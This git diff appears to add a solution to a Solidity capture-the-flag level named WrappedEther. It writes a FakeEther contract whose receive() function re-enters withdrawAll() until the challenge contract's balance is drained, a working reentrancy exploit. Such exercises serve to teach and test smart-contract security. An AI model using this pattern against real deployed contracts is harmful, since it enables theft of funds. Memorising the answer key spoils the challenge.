@@ -4,6 +4,20 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/13_WrappedEther/WrappedEther.sol";
 
+
+contract FakeEther {
+    function manOfSteel(WrappedEther instance) payable external {
+        instance.deposit{value:msg.value}(address(this));
+        instance.withdrawAll();
+    }
+
+    receive() external payable {
+        if (msg.sender.balance > 0) {
+            WrappedEther(msg.sender).withdrawAll();
+        }
+    }
+}
+
 // forge test --match-contract WrappedEtherTest
 contract WrappedEtherTest is BaseTest {
     WrappedEther instance;
@@ -19,7 +33,9 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        FakeEther feelItSteel = new FakeEther();
+
+        feelItSteel.manOfSteel{value: 0.09 ether}(instance);
 
         checkSuccess();
     }
